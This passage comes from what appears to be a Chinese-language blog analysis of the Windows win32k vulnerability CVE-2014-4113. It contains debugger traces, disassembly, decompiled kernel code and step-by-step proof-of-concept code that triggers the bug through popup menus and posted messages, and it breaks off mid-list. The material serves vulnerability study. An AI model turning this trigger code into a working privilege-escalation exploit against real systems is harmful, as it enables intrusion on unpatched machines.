class="number">71</span>b     win<span class="number">32</span>k<span class="title">!xxxMNLoop</span>+<span class="number">0x2c6</span></div><div class="line"><span class="number">04</span> <span class="number">96</span>cb<span class="number">9</span>ca<span class="number">0</span> <span class="number">94</span>ac<span class="number">58</span>a<span class="number">5</span>     win<span class="number">32</span>k<span class="title">!xxxTrackPopupMenuEx</span>+<span class="number">0x5cd</span></div><div class="line"><span class="number">05</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">83e4542</span>a     win<span class="number">32</span>k<span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc3</span></div><div class="line"><span class="number">06</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">77</span>ce<span class="number">64</span>f<span class="number">4</span> (T) nt<span class="title">!KiFastCallEntry</span>+<span class="number">0x12a</span></div><div class="line"><span class="number">07</span> <span class="number">003</span>bf<span class="number">678</span> <span class="number">775</span>b<span class="number">5</span>f<span class="number">7</span>e (T) ntdll<span class="title">!KiFastSystemCallRet</span></div><div class="line"><span class="number">08</span> <span class="number">003</span>bf<span class="number">67</span><span class="keyword">c</span> <span class="number">775</span>b<span class="number">4</span>b<span class="number">56</span>     user<span class="number">32</span><span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc</span></div><div class="line"><span class="number">09</span> <span class="number">003</span>bf<span class="number">69</span><span class="keyword">c</span> <span class="number">000</span>f<span class="number">12</span>ba     user<span class="number">32</span><span class="title">!TrackPopupMenu</span>+<span class="number">0x1b</span></div><div class="line">WARNING: Frame IP not in any known <span class="keyword">module</span>. Following frames</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据异常信息，然后esi值为<code>fffffffb</code>,查看反汇编情况，esi的值源于<code>win32k!xxxSendMessageTimeout</code>的第一个参数，并最终发现产生漏洞的原因在于<code>xxxMNFindWindowFromPoint</code>函数的返回值，复制给ebx，并且没有进行必要的校验,就作为参数传入xxxSendMessage发送<code>MN_BUTTONDOWN</code>消息。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B52</span>                 <span class="selector-tag">mov</span>     <span class="selector-attr">[esi+0Ch]</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B55</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a3</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B56</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">eax</span>, <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B59</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">eax</span>             ; <span class="selector-tag">a2</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5A</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">tagpopupmenu</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5B</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNFindWindowFromPoint</span>@<span class="keyword">12</span> ; <span class="selector-tag">xxxMNFindWindowFromPoint</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B60</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">ebx</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-attr">[....]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span> <span class="selector-tag">loc_94AC8035</span>:                           ; <span class="selector-tag">CODE</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">xxxHandleMenuMessages</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)+563↑<span class="selector-tag">j</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span>                 <span class="selector-tag">push</span>    0</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8037</span>                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803A</span>                 <span class="selector-tag">push</span>    1<span class="selector-tag">EDh</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803F</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8040</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure></p><h2 id="0x02-poc构建"><a href="#0x02-poc构建" class="headerlink" title="0x02 poc构建"></a>0x02 poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据栈回溯以及微软提供的漏洞信息，可以知道该漏洞发生在<code>win32k!xxxHandleMenuMessages</code>,在用户层触发该漏洞的函数是<code>user32!TrackPopupMenu</code>。<code>TrackPopupMenu</code>的函数原型如下,其作用是在任何地方显示快捷菜单和跟踪菜单的选择。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> TrackPopupMenu(</div><div class="line">  [<span class="keyword">in</span>]           HMENU      hMenu,   <span class="comment">//菜单句柄</span></div><div class="line">  [<span class="keyword">in</span>]           <span class="built_in">UINT</span>       uFlags,  </div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        x,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        y,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        nReserved,</div><div class="line">  [<span class="keyword">in</span>]           HWND       hWnd,    <span class="comment">//拥有快捷菜单的窗口句柄</span></div><div class="line">  [<span class="keyword">in</span>, optional] <span class="keyword">const</span> RECT *prcRect</div><div class="line">);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>TrackPopupMenu</code>的函数原型，重要的参数hMemu和hWnd，hMenu是菜单句柄，该参数是由CreatePopupMenu生成，hWnd是窗口句柄，hWnd参数是由CreateWindows生成，构建的poc如下，但是这样肯定无法触发漏洞。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ATOM reg = RegisterClassA(<span class="name">&amp;wnd_class</span>)<span class="comment">;</span></div><div class="line">HWND main_wnd = CreateWindowA(<span class="name">wnd_class</span>.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL)<span class="comment">;</span></div><div class="line">HMENU MenuOne = CreatePopupMenu()<span class="comment">;</span></div><div class="line">BOOL insertMenuItem = InsertMenuItemA(<span class="name">MenuOne</span>, <span class="number">0</span>, TRUE, <span class="symbol">&amp;MenuOneInfo</span>)<span class="comment">;</span></div><div class="line">TrackPopupMenu(<span class="name">MenuOne</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，在<code>win32k!xxxHandleMenuMessages</code>打一个断点，接着根据上面分析，漏洞产生原因是没有对位于<code>win32k!xxxHandleMenuMessages+0x99</code>的<code>xxxMNFindWindowFromPoint</code>的返回值进行校验。该地址主要有两个引用点。</p><ul><li><code>win32k!xxxHandleMenuMessages+0x5D</code></li><li><code>win32k!xxxHandleMenuMessages+0x25A</code></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想触发到<code>v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</code>主要有两条路径，第一条路径，当发送WM_LBUTTONDOWN(0x201)消息给窗口的时候触发，第二条路径，发送WM_RBUTTONDOWN消息，并且<code>(*tagPopupMenu &amp; 0x40) != 0</code>需要符合这两个条件。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">//第一条路径</div><div class="line">  message = tagMsg-&gt;message;</div><div class="line">  v6 = tagMsg-&gt;wParam;</div><div class="line">  v7 = tagMsg-&gt;lParam;</div><div class="line">  v44 = v6;</div><div class="line">  a3 = v7;</div><div class="line"> <span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // message = 0xFC + 0x105 = 0x201</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);// &lt;------CVE-2014-4113</div><div class="line">//第二条路径</div><div class="line">      case 0x204u:</div><div class="line">LABEL_12:</div><div class="line">       <span class="built_in"> if </span>( (*tagPopupMenu &amp; 0x40) != 0 )</div><div class="line">         <span class="built_in"> goto </span><span class="class">LABEL_13;</span>                        // &lt;------</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_76;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里详细解释一下<code>(*tagPopupMenu &amp; 0x40) != 0</code>,其汇编代码如下,可以看到tagPOPUPMENU偏移为0的地址和40h进行test。40h的2进制表示为‭01000000‬，这里判断第一个字节是否含有 fRightButton 标志位。所以，在第二条路径上需要满足如下两个条件</p><ul><li>发送WM_RBUTTONDOWN消息</li><li>设置fRightButton标志<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi+tagPOPUPMENU._bf_0], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line"><span class="comment">//</span></div><div class="line">kd&gt; dt tagPOPUPMENU</div><div class="line">win32k!tagPOPUPMENU</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsMenuBar       :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHasMenuBar      :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsSysMenu       :</span> Pos <span class="number">2</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsTrackPopup    :</span> Pos <span class="number">3</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDroppedLeft     :</span> Pos <span class="number">4</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHierarchyDropped :</span> Pos <span class="number">5</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRightButton     :</span> Pos <span class="number">6</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fToggle          :</span> Pos <span class="number">7</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSynchronous     :</span> Pos <span class="number">8</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFirstClick      :</span> Pos <span class="number">9</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDropNextPopup   :</span> Pos <span class="number">10</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fNoNotify        :</span> Pos <span class="number">11</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fAboutToHide     :</span> Pos <span class="number">12</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fShowTimer       :</span> Pos <span class="number">13</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHideTimer       :</span> Pos <span class="number">14</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDestroyed       :</span> Pos <span class="number">15</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDelayedFree     :</span> Pos <span class="number">16</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFlushDelayedFree :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFreed           :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fInCancel        :</span> Pos <span class="number">19</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fTrackMouseEvent :</span> Pos <span class="number">20</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSendUninit      :</span> Pos <span class="number">21</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRtoL            :</span> Pos <span class="number">22</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">iDropDir         :</span> Pos <span class="number">23</span>, <span class="number">5</span> Bits</div><div class="line">   +<span class="number">0x000</span> <span class="string">fUseMonitorRect  :</span> Pos <span class="number">28</span>, <span class="number">1</span> Bit</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何发送消息呢，可以在WndProc函数中调用PostMessage发送消息<code>PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);</code><br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK WndProc(<span class="keyword">HWND</span> <span class="keyword">hwnd</span>, UINT msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) </div><div class="line">&#123;</div><div class="line">printf(<span class="string">"WindProc called with message=%x\n"</span>, msg)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (msg == WM_ENTERIDLE) &#123;</div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">; </span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(<span class="keyword">hwnd</span>, msg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后进入<code>win32k!xxxMNFindWindowFromPoint</code>中，就像函数名称存在<code>xxx</code>前缀，说明在该函数中存在回调到用户侧的执行逻辑，首先，<code>win32k!xxxMNFindWindowFromPoint</code>会判断是否存在spwndNextPopup的子菜单窗口对象，如果存在子菜单窗口对象，就会调用 xxxSendMessage发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">int  xxxMNFindWindowFromPoint(<span class="name">tagPOPUPMENU</span> *tagpopupmenu, tagPOPUPMENU **a2, unsigned int a3)</div><div class="line">&#123;</div><div class="line">  v3 = a2;</div><div class="line">  *a2 = <span class="number">0</span><span class="comment">;</span></div><div class="line">  tagpopupmenu_ = tagpopupmenu<span class="comment">;</span></div><div class="line">  spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  if ( <span class="name">spwndNextPopup</span> )                         // v5 不为空</div><div class="line">  &#123;</div><div class="line">    v23[<span class="number">0</span>] = *(gptiCurrent + 45);</div><div class="line">    *(<span class="name">gptiCurrent</span> + <span class="number">45</span>) = v23<span class="comment">;</span></div><div class="line">    v23[<span class="number">1</span>] = spwndNextPopup<span class="comment">;</span></div><div class="line">    ++spwndNextPopup-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">    v6 = xxxSendMessage(<span class="name">tagpopupmenu_-&gt;spwndNextPopup</span>, <span class="number">0</span>x1EB, <span class="symbol">&amp;tagpopupmenu</span>, (<span class="name">a3</span> | (<span class="name">HIWORD</span>(<span class="name">a3</span>) &lt;&lt; <span class="number">16</span>)))<span class="comment">;// 为什么返回值为0xfffffffb</span></div><div class="line">    ThreadUnlock1()<span class="comment">;</span></div><div class="line">    if ( <span class="name">IsMFMWFPWindow</span>(<span class="name">v6</span>) )</div><div class="line">      v6 = HMValidateHandleNoSecure(<span class="name">v6</span>, <span class="number">1</span>)<span class="comment">;     // return 0xfffffffb</span></div><div class="line">    if ( <span class="name">v6</span> )</div><div class="line">    &#123;</div><div class="line">      *v3 = tagpopupmenu;</div><div class="line">      return v6;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">[.....]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNFindWindowFromPoint</code>用来获取tagWnd对象，该函数首先判断<code>tagpopupmenu</code>对象的spwndNextPopup是否为空，如果不为空的话，就会调用xxxSendMessage对子弹出菜单发送MN_FINDMENUWINDOWFROMPOINT(0x1EB)消息。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">tagpopupmenu_ = tagpopupmenu;</div><div class="line">spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</div><div class="line">if ( spwndNextPopup )                         // v5 不为空</div><div class="line">&#123;</div><div class="line">  v23[0] = *(gptiCurrent + 45);</div><div class="line">  *(gptiCurrent + 45) = v23;</div><div class="line">  v23[1] = spwndNextPopup;</div><div class="line">  ++spwndNextPopup-&gt;head.c<span class="class">LockObj;</span></div><div class="line">  v6 = xxxSendMessage(tagpopupmenu_-&gt;spwndNextPopup, 0x1EB, &amp;tagpopupmenu, (a3 | (HIWORD(a3) &lt;&lt; 16)));// 为什么返回值为0xfffffffb</div><div class="line">  ThreadUnlock1();</div><div class="line"> <span class="built_in"> if </span>( IsMFMWFPWindow(v6) )</div><div class="line">    v6 = HMValidateHandleNoSecure(v6, 1);     //<span class="built_in"> return </span>0xfffffffb</div><div class="line"> <span class="built_in"> if </span>( v6 )</div><div class="line">  &#123;</div><div class="line">    *v3 = tagpopupmenu;</div><div class="line">   <span class="built_in"> return </span>v6;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxSendMessage</code>最终调用<code>xxxSendMessageTimeout</code>函数，在<code>xxxSendMessageTimeout</code>中，首先判断发送窗口是否属于当前进程，以及判断是否处于Hook状态，并最终调用<code>win32k!xxxMenuWindowProc</code>。<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt <span class="keyword">tag</span>WND fe810650</div><div class="line">win32k!<span class="keyword">tag</span>WND</div><div class="line">   +<span class="number">0</span>x000 head             : _THRDESKHEAD</div><div class="line">   +<span class="number">0</span>x014 <span class="keyword">state</span>            : <span class="number">0</span>x40000</div><div class="line">[...]</div><div class="line">   +<span class="number">0</span>x050 rcClient         : <span class="keyword">tag</span>RECT</div><div class="line">   +<span class="number">0</span>x060 lpfnWndProc      : <span class="number">0</span>x95abdd97     long  win32k!xxxMenuWindowProc+<span class="number">0</span></div><div class="line">[...]</div><div class="line">kd&gt; kn</div><div class="line"> <span class="comment"># ChildEBP RetAddr      </span></div><div class="line"><span class="number">00</span> <span class="number">991</span>c0940 <span class="number">95</span>a44859     win32k!xxxMenuWindowProc</div><div class="line"><span class="number">01</span> <span class="number">991</span>c0980 <span class="number">95</span>a446a4     win32k!xxxSendMessageTimeout+<span class="number">0</span>x1ac</div><div class="line"><span class="number">02</span> <span class="number">991</span>c09a8 <span class="number">959</span>cb88b     win32k!xxxSendMessage+<span class="number">0</span>x28</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMenuWindowProc</code>首先检查了窗口对象的状态，然后根据message执行不同的操作。当message为MN_FINDMENUWINDOWFROMPOINT时，继续将弹出窗口ppopupmenu传入xxxMNFindWindowFromPoint，并最终返回窗口对象。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case MN_FINDMENUWINDOWFROMPOINT:</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">     * lParam <span class="keyword">is</span> point <span class="keyword">to</span> search <span class="keyword">for</span> <span class="keyword">from</span> this hierarchy down.</div><div class="line">     * returns MFMWFP_* value <span class="keyword">or</span> a pwnd.</div><div class="line">     */</div><div class="line">    lRet = xxxMNFindWindowFromPoint(ppopupmenu, (PUINT)wParam, MAKEPOINTS(lParam));</div><div class="line">    /*</div><div class="line">     * Convert <span class="literal">return</span> value <span class="keyword">to</span> a handle.</div><div class="line">     */</div><div class="line">    <span class="keyword">if</span> (IsMFMWFPWindow(lRet)) &#123;</div><div class="line"><span class="built_in">        return</span> (LRESULT)HW((PWND)lRet);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">        return</span> lRet;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为<code>spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</code>不为空，所以在构造poc的时候需要创建两个菜单对象，新构造的poc如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step4：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，进入<code>win32k!xxxSendMessageTimeout</code>,【在挖一个坑，学习xxxSendMessageTimeout机制】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>win32k!xxxSendMessageTimeout</code>中调用<code>xxxSendMessageToClient</code>向用户侧发送MN_FINDMENUWINDOWFROMPOINT消息，此时执行流会回调到用户层，从而给了机会销毁菜单对象，从而有了触发漏洞前提。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想执行流执行<code>xxxSendMessageToClient</code>，需要满足一下几个条件：</p><ul><li>pwnd != -1 (已满足）</li><li>gptiCurrent == 